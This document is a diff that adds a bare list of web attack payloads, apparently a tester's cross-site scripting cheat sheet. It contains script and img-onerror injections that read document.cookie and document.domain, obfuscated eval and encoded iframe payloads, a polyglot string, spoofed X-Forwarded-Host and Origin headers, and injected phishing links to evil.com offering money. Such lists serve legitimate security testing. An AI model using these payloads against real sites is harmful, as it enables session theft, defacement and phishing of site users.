@@ -1,0 +1,82 @@
+<input type="text" name="email" class="field" placeholder="Enter your Email" 
+value=""> />hello<script>alert(1)</script>">
+
+"> />hello<script>alert(1)</script>
+
+"><img src/onerror=prompt(123)>
+"><script>(document.cookie);</script>
+
+"><script>alert(document.cookie)</script>
+
+"><img src/onerror=prompt(document.cookie)>
+
+"><img src/onerror=prompt("XSS")>
+
+"><img src/onerror=prompt("www.evil.com")>
+
+"><img src='www.evil.com' onerror=alert(1) />
+
+"><img src=x onerror=alert(document.domain)>
+
+<xhzeem/x=" onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>
+
+><iframe> src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+
+"><img src=x Onerror="top[8680439..toString(30)](document.cookie)">
+
+"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
+
+X-Forwarded-Host: bing.com
+
+<svg on onload=(alert)(document.domain)>
+
+X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)>
+
+Origin: https://innocent-website.com
+
+X-Forwarded-For: 127.0.0.1
+
+https://www.omise.co/
+
+<img src=1 onerror=alert(1)>
+
+<a href="www.google.com">hello</a>
+
+</script><script>alert(document.domain)</script>
+
+“><script>alert(document.domain)</script>
+
+</script><script>prompt('Hacked_by_Oblivion')</script>
+
+<b><a href="http://evil.com">Click Here</a></b>
+
+<a href="accesskey=x onclick=alert(document.domain)//"></a>
+
+<a href=http://evil.com><font size=100 color=red>Get 100$</font></a><base target="
+
+<a href=http://evil.com><font size=100 color=red>Get 100$</font></a>
+
+%3Cstyle%3E%20*%20{%20background:%20url(https://th.bing.com/th/id/OIP.UdaBf0ZCiPW-L1_inG_7VAHaEK?pid=ImgDet&rs=1);%20}
+
+&#34;&#62;&#60;&#34;&#62;&#60;img src=x onerror=prompt(document.domain)&#62; img src=x onerror=prompt(document.domain)&#62;
+
+OnMoUsEoVeR=prompt(/hacked/)//
+
+%22%3E%3Cimg%20src=nonext%20onerror=alert(document.domain)%3E
+
+<a href="http://evil.com">Click_Here_to_get_$1000</a>
+
+<img src="https//www.w3schools.com/tags/img_girl.jpg">
+
+"><img src=x onerror=javascript:alert(document.cookie)>
+
+"><img src=x onerror=javascript:alert('Hacked_by_Oblivion')>
+
+
+<h1><font Color=red>Visit Our New WebSite </h1><h3><mark><a href="https://example.com">e x a m p l e . c o m </a></mark></h3>
+
+"><img src=x onerror=javascript:alert('Hacked_by_Oblivion')>
+
+💋img src=x onerror=alert(document.domain)//💛
+
+JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
